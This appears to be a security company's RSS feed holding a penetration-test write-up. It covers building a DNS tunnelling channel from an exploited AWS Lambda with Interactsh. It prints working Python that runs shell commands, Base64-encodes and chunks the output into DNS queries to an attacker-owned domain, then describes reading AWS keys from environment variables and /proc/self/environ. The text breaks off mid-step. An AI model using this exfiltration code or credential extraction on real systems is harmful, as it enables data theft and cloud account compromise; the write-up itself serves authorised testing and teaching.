<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>JUMPSEC – Vulnerability</title>
    <link>//localhost:1313/categories/vulnerability/</link>
    <description>Recent content in Vulnerability on JUMPSEC</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-GB</language>
    <lastBuildDate>Thu, 13 Jun 2024 00:00:00 +0000</lastBuildDate>
    
	  <atom:link href="//localhost:1313/categories/vulnerability/index.xml" rel="self" type="application/rss+xml" />
    
    
      
        
      
    
    
    <item>
      <title>What’s in a Name? Writing custom DNS tunnelling protocol, exploiting unexpected AWS Lambda misconfiguration – in a web app Pen test (Part 2)</title>
      <link>//localhost:1313/articles/2024/06/2024-06-13-whats-in-a-name-writing-custom-dns-tunnelling-protocol-exploiting-unexpected-aws-lambda-misconfiguration-in-a-web-app-pen-test-part-2/</link>
      <pubDate>Thu, 13 Jun 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/06/2024-06-13-whats-in-a-name-writing-custom-dns-tunnelling-protocol-exploiting-unexpected-aws-lambda-misconfiguration-in-a-web-app-pen-test-part-2/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/unnamed.gif&#34; title=&#34;unnamed&#34; alt=&#34;unnamed&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;unnamed&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In &lt;a href=&#34;https://labs.jumpsec.com/whats-in-a-name-writing-custom-dns-tunnelling-protocol-on-the-fly-exploiting-unexpected-aws-lambda-misconfiguration-all-in-a-web-app-pen-test-part-1/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Part 1&lt;/a&gt; of the series we looked at how an AWS Lambda-powered feature was exploited in a web app penetration test initially leading to RCE and further on with out-of-band data exfiltration via DNS. Though the exact mechanism of achieving remote-code execution with Python was not discussed, we went in depth in how to return data as a result of the code being executed. Initially, with ascii-to-integer encoding I was able to find the username of the runtime user - sbx_userNNN.&lt;/p&gt;
&lt;p&gt;In the first blog post, I spoke of the feature being powered by Lambda rather matter-of-factly, however during the penetration test, the &amp;ldquo;sbx_u&amp;rdquo; string was the first clue that the function I popped was powered by a Lambda.&lt;/p&gt;
&lt;p&gt;Screenshot showing decoding results of whoami:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic1.png&#34; title=&#34;pic1 1&#34; alt=&#34;pic1 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic1 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic2.png&#34; title=&#34;pic2 1&#34; alt=&#34;pic2 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic2 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;After proving that RCE worked stably with limited data output in the application UI, I further discovered that although the app did not talk back via HTTP or HTTPS, it was making DNS requests to arbitrary domains. While BurpSuite&amp;rsquo;s Collaborator functionality was working fine for demonstrating proof-of-concept interactions, it presented a couple of problems as I went further:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic8.png&#34; title=&#34;pic8&#34; alt=&#34;pic8&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic8&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Scalability &amp;amp; UX - I didn&amp;rsquo;t know at the time, but had vaguely remembered, that the exact data length limit of the DNS protocol was around 255 bytes total - need to RTFM (more detail on this later). But even at this point I knew I could not chuck thousands of bytes into a domain name and ask the poor Lambda to query for us. That meant we needed to split command outputs into multiple chunks at some point. Burp is written in Java and the UI (as seen above) would require manually clicking through hundreds of queries to copy and paste the data for further decoding. I needed a tool that either wrote each query to terminal or append to a file, that I could further decode and process.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Privacy &amp;amp; Cost - Honestly, avoiding manually clicking through hundreds of queries was a good enough reason to not proceed further in Burp. However, at that juncture my concerns also included privacy. If I proceeded further on this attack path, I would potentially be exfiltrating intellectual property of the client via the oastify.com domain, which was shared by all users of Burp Collaborator, including other pentesting providers and potentially cybercriminals. Not that I don&amp;rsquo;t trust PortSwigger as a company, but I don&amp;rsquo;t want to mess up some of the queries on my end and potentially send the encoded data to unknown entities.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A final reason, which may not apply to us, but for those reading this article who are just starting out in Cyber - BurpSuite Collaborator is a paywalled feature and the annual enterprise licensing cost may be prohibitive for many hobbyists or learners.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Moving the antenna to our own infrastructure&lt;span class=&#34;absolute -mt-20&#34; id=&#34;moving-the-antenna-to-our-own-infrastructure&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#moving-the-antenna-to-our-own-infrastructure&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;So, is there a private, low-cost / free DNS interaction tool which outputs the log to either the terminal or a file, and works with a domain owned by us? Initially I had fleeting thoughts of spinning up a Bind9 DNS server on a VPS and use a couple of hacked-together shell scripts to do it, but then I thought, man, there are plenty of smart folks in my team who know either this tool or that tool off like the back of their hand, which would serve my specific purpose.&lt;/p&gt;
&lt;p&gt;I asked our techies for help. Initially our developer volunteered to adapt his custom DNS server written in Go for this purpose, but before we could see this big-brain moment through, he had other more pressing matters than pursuing this side quest (a failed motherboard I heard). Then another consultant introduced me to &lt;a href=&#34;https://github.com/projectdiscovery/interactsh&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Interactsh&lt;/a&gt;, an open source tool maintained by ProjectDiscovery, designed to detect out-of-band (OOB) interactions. By default the oast.pro domain (I imagine owned by ProjectDiscovery) is used to catch queries, but one could buy a domain for a couple of bucks and tell the tool to point to it instead.&lt;/p&gt;
&lt;p&gt;Again DNS can be quite complicated if you&amp;rsquo;re not that familiar with the protocol - so I&amp;rsquo;ll briefly explain how the tool works here:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;[vuln app] ---makes DNS query A----&amp;gt; [server]
# then
[client] --ask for records of OOB-----&amp;gt; [server]
[client] &amp;lt;--sends DNS query A details-- [server]&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;In part 1 of this series I explained how DNS exfiltration works, so go to the relevant sections if you want a refresher on that. In the case of Interactsh, the &amp;ldquo;central server&amp;rdquo; maintained by ProjectDiscovery would resolve queries pointing towards subdomains of oast.pro. As a bug bounty hunter, you use the interactsh client to connect to the central interactsh server and be given a unique id. Any OOB interaction caught by the server, which matches your unique ID would be sent to your client and be displayed on your terminal. Screenshot below is from the README of the project, showing how the ID matching works.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic9.png&#34; title=&#34;pic9&#34; alt=&#34;pic9&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic9&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In comparison, shown below is how I set Interactsh up for the engagement. As described in part 1, I needed a domain where we can edit NS and A records. Let&amp;rsquo;s say we own &amp;ldquo;awesome-blogpost.com&amp;rdquo; and I decided to use subdomains of &amp;ldquo;subdomain.awesome-blogpost.com&amp;rdquo; as the query catcher. I spun up a public facing VPS with a static IP address a.b.c.d, pointed the the NS record for the subdomain to it, much like the below (read part 1 if this doesn&amp;rsquo;t make much sense):&lt;/p&gt;
&lt;p&gt;Set an NS record for &lt;code&gt;ns1.awesome-blogpost.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic10.png&#34; title=&#34;pic10&#34; alt=&#34;pic10&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic10&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;So we first start our server on the publicly-facing VPS with domain specified and the server CLI would provide you have a client token, which is like a unique password for the client to connect to (says text in the screenshot because &amp;ldquo;text&amp;rdquo; was the actual subdomain I used in the engagement).&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic11.png&#34; title=&#34;pic11&#34; alt=&#34;pic11&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic11&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic12.png&#34; title=&#34;pic12&#34; alt=&#34;pic12&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic12&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Then on my local machine, I connect to my server with with the client token and the &lt;code&gt;-dns-only&lt;/code&gt; flag, and you can see a unique URL being provided as a OOB payload. If anything makes a DNS query to &amp;ldquo;cnson… .text.awesome-blogpost.com&amp;rdquo;, my server would catch it and show it to the client.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic13.png&#34; title=&#34;pic13&#34; alt=&#34;pic13&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic13&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;Encoding adventures - weird Python error &amp;amp; RTFM&lt;span class=&#34;absolute -mt-20&#34; id=&#34;encoding-adventures---weird-python-error--rtfm&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#encoding-adventures---weird-python-error--rtfm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Before heading off to data encoding and the matter of writing a bootleg encoding protocol, let&amp;rsquo;s first address one thing - DNS is not meant for transmitting arbitrary length messages. I found out the hard way when trying to pipe &lt;code&gt;/etc/passwd&lt;/code&gt; (pentester&amp;rsquo;s favorite!) through the wire - that Python complained of this (on my local testing script):&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Traceback (most recent call last):
  File &amp;#34;/usr/lib/python3.10/encodings/idna.py&amp;#34;, line 163, in encode
    raise UnicodeError(&amp;#34;label empty or too long&amp;#34;)
UnicodeError: label empty or too long&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;To replicate this at home, you can try to run this:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;python3 -c &amp;#39;import socket; longname = &amp;#34;A&amp;#34; * 1000; req = socket.gethostbyname(f&amp;#34;{longname}.example.com&amp;#34;)&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;What happened in that one command was Python being asked to do a DNS request for &amp;ldquo;AAAAA…(1000 of A&amp;rsquo;s)…AAA.example.com&amp;rdquo;. Searching for that error on Google landed me on a &lt;a href=&#34;https://stackoverflow.com/questions/51901399/python-requests-encoding-with-idna-codec-failed-unicodeerror-label-empty-o&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;StackOverflow question&lt;/a&gt; where a dev encountered the same error. A knowledgeable user answered the question explaining that it was actually not a &amp;ldquo;Unicode error&amp;rdquo; but rather a DNS protocol error, implicating the cause being the subdomain within a DNS query being way too long, quote:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It seems this is an issue from the &lt;code&gt;socket&lt;/code&gt; module. It fails when the URL&amp;rsquo;s hostname exceeds 64 characters.&lt;/p&gt;
&lt;p&gt;This is still an open issue &lt;a href=&#34;https://bugs.python.org/issue32958&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://bugs.python.org/issue32958&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Digging deeper into the bug report linked, another user wrote, quote:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The error can be consistently reproduced when the first substring of the url hostname is greater than 64 characters long, as in &amp;ldquo;0123…..90123.example.com&amp;rdquo;. This wouldn&amp;rsquo;t be a problem, … so the entire &amp;ldquo;[user]:[secret]@XXX&amp;rdquo; section must be less than 65 characters long.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;During the pentest I took the explaination as is because 64-byte limit sounded right, though I actually limited my encoding to 60-byte in total for some imagined &amp;ldquo;leeway&amp;rdquo;. When writing this blog post, I read the &lt;a href=&#34;https://www.rfc-editor.org/rfc/rfc1035&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;RFC1035 for DNS&lt;/a&gt; to confirm this (and say I have RTFM&amp;rsquo;d) and discovered, on page 7, that:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The labels … must start with a letter, end with a letter or digit, and have as interior characters only letters, digits, and hyphen … Labels must be 63 characters or less.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Turns out that those users were slightly wrong in that the maximum subdomain / hostname / label defined by the RFC was actually 63-bytes, not 64. You can verify this with tweaking the &lt;code&gt;longname&lt;/code&gt; variable to 64 and 63 in the Python oneliner above. Knowing that the final messages will be maximally 63-byte chunks definitely helps.&lt;/p&gt;
&lt;p&gt;Next we need to think about other limitations of the DNS protocol. In the RFC we just referenced, it is also stated that a label must consist only of (case-insensitive) letters, digits and hyphen. With the input space (command output i.e. STDOUT) consisting of all printable Ascii, including symbols like &lt;code&gt;%^@*#|/&lt;/code&gt;, &lt;code&gt;space&lt;/code&gt; and &lt;code&gt;newline&lt;/code&gt;, and the output space only consisting of letters, numbers and the unassuming hyphen &lt;code&gt;-&lt;/code&gt;, it is clear that some sort of encoding scheme is needed.&lt;/p&gt;
&lt;p&gt;The solution I came up with was the unassuming Base64 encode. Ideally you would want to encrypt the data with something like AES256 CBC as is the case for &amp;ldquo;production&amp;rdquo; C2 frameworks like Cobalt Strike, but we are dealing with a UAT build so let&amp;rsquo;s just roll with what we have.&lt;/p&gt;
&lt;p&gt;Before dealing with the message length, lets see how I implemented the encoding with the code snippet below - first we read the command output for popen() and encode into UTF-8 (because b64encode takes a byte sequence), then the payload was Base64 encoded, gets back a string with decode(&amp;lsquo;UTF-8&amp;rsquo;), and remove all the trailing &lt;code&gt;=&lt;/code&gt; which might appear in b64 encoding.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;data = popen(&amp;#39;uname -r&amp;#39;).read().encode(&amp;#39;UTF-8&amp;#39;) 
payload = b64encode(data).decode(&amp;#39;utf-8&amp;#39;).replace(&amp;#39;=&amp;#39;,&amp;#39;&amp;#39;)
url = f&amp;#39;http://{payload}..subdomain.awesome-blogpost.com&amp;#39;
lookup = gethostbyname(url)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;On Interactsh, we should get back the encoded output:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;[NS4xMC4yMTYtMjI1Ljg1NS5hbXpuMi54ODZfNjQK.&amp;lt;uuid&amp;gt;.subdomain.awesome-blogpost.com.] received DNS interaction from 35....&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Using the &lt;code&gt;base64&lt;/code&gt; cli utility, we would then get back the command output for &lt;code&gt;uname -r&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ echo -n &amp;#39;NS4xMC4yMTYtMjI1Ljg1NS5hbXpuMi54ODZfNjQK&amp;#39; | base64 -d
5.10.216-225.855.amzn2.x86_64&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic7.png&#34; title=&#34;pic7&#34; alt=&#34;pic7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h4&gt;Chunks &amp;amp; Ordering&lt;span class=&#34;absolute -mt-20&#34; id=&#34;chunks--ordering&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#chunks--ordering&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;When I first learnt about how TCP worked, it fascinated me with the inner mechanisms of stateful sessions, message ordering, length and integrity checks, and so on. Basically the protocol involves chopping the sender&amp;rsquo;s message into little chunks, and the receiver can receive them in any order, recombine the chunks, and get back the original message, with a check that a) the message is intact and, b) the message has ended. How brilliant!&lt;/p&gt;
&lt;p&gt;Now that I am about to chop my bootleg DNS messages into 60-odd byte chunks, the minimum that I need to implement is a system which gives a little index tag to the message, and when I get back the messages in any order, my decoder will be able to rearrange them, combine back the original message, and decode them as one.&lt;/p&gt;
&lt;p&gt;Below is how I implemented it (with a little bit of help from our friend ChatGPT…) - if the payload is less than 60 bytes long, we define that the number of segments is 0. Otherwise, it will just be the result of the length of the payload divided by 60 (e.g. for 80 byte payload, the number of segments is 2). We loop through the segments, cutting out &lt;code&gt;60*(n) to 60*(n+1) th&lt;/code&gt; bytes, and finally add the index label before the payload in the final DNS query:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;    data = popen(&amp;#39;ls /usr/bin&amp;#39;).read().encode(&amp;#39;UTF-8&amp;#39;) 
    payload = b64encode(data).decode(&amp;#39;utf-8&amp;#39;).replace(&amp;#39;=&amp;#39;,&amp;#39;&amp;#39;)

    if len(payload) % 60 == 0:
        num_segments = 0
    else:
        num_segments = (len(payload) // 60) &amp;#43; 1 

    for i in range(num_segments):
        start_index = i * 60
        end_index = start_index &amp;#43; 60
        segment = payload[start_index:end_index]
        url = f&amp;#39;{i}.{segment}..subdomain.awesome-blogpost.com&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And the glorious moment of seeing the results back:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;    _       __                       __       __  
   (_)___  / /____  _________ ______/ /______/ /_ 
  / / __ \/ __/ _ \/ ___/ __ &amp;#39;/ ___/ __/ ___/ __ \
 / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /
/_/_/ /_/\__/\___/_/   \__,_/\___/\__/____/_/ /_/

        projectdiscovery.io
[INF] Listing 1 payload for OOB Testing
[INF] .subdomain.awesome-blogpost.com

[0.WwphbGlhcwphcmNoCmF3awpiMnN1bQpiYXNlMzIKYmFzZTY0CmJhc2VuYW1l.] Received DNS interaction (A) from 3.9.x.x at ...
[1.CmJhc2VuYwpiYXNoCmJhc2hidWcKYmFzaGJ1Zy02NApiZwpjYS1sZWdhY3kK.] Received DNS interaction (A) from 3.9.x.x at ...
[2.Y2F0CmNhdGNoc2VndgpjZApjaGNvbgpjaGdycApjaG1vZApjaG93bgpja3N1.] Received DNS interaction (A) from 35.177.x.x at ...
[3.bQpjb21tCmNvbW1hbmQKY29yZXV0aWxzCmNwCmNzcGxpdApjdXJsCmN1dApk.] Received DNS interaction (A) from 18.134.x.x at ...
[4.YXRlCmRkCmRmCmRpcgpkaXJjb2xvcnMKZGlybmFtZQpkbmYKZHUKZWNobwpl.] Received DNS interaction (A) from 35.177.x.x at ...
[5.Z3JlcAplbnYKZXhwYW5kCmV4cHIKZmFjdG9yCmZhbHNlCmZjCmZnCmZncmVw.] Received DNS interaction (A) from 35.177.x.x at ...
...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Mouse over and copy the output, run it through a oneliner to remove the extra stuff, sort it, remove the duplicates, and decode the whole thing:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ xclip -o clip | cut -d &amp;#39; &amp;#39; -f 1 | sed &amp;#39;s/\[//;s/\.\]//&amp;#39; | sort -h | uniq &amp;gt; output26; python3 decode2.py output26
Decoded string: 

alias
arch
awk
...
ls
md5sum
microdnf
mkdir
...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;Look at me, I am the Lambda now&lt;span class=&#34;absolute -mt-20&#34; id=&#34;look-at-me-i-am-the-lambda-now&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#look-at-me-i-am-the-lambda-now&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Now we are cooking! That&amp;rsquo;s basically a semi-interactive shell (with a couple of extra steps). Each command we want to run we put it in the popen(), invoke the app&amp;rsquo;s feature, get back results from Interactsh, and decode in Python. I&amp;rsquo;ll skip the enumeration bit and jump straight to the post-exploitation. Knowing that we are inside of an AWS Lambda, there are quite a few angles to tackle and exploit this. For more information specific to Lambda exploitation, refer to &lt;a href=&#34;https://hackingthe.cloud/aws/post_exploitation/lambda_persistence/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Hacktricks&amp;rsquo; articles on this&lt;/a&gt;. Sadly the pentest timeline was approaching its end and I felt the need to go for the highest impact finding as soon as possible, instead of exploring with a leisurely pace. Having a way to get data out and run commands, we could read environmental variables to extract the AWS secret &amp;amp; access keys of the application. With AWS credentials you can impersonate the application&amp;rsquo;s identity and access (supposedly) whatever the app could access inside of the AWS tenant.&lt;/p&gt;
&lt;p&gt;This was the first method I demonstrated, showing how the &amp;ldquo;AWS_ACCESS_KEY_ID&amp;rdquo; was extracted with os.envrion.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic14.png&#34; title=&#34;pic14&#34; alt=&#34;pic14&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic14&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The second method, reading the environmental vars from &lt;code&gt;/proc/self/environ&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic15.png&#34; title=&#34;pic15&#34; alt=&#34;pic15&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic15&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;To authenticate to AWS with these credentials on the cli, you first put the keys extracted into a profile in your &lt;code&gt;~/.aws/credentials&lt;/code&gt; file like this:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
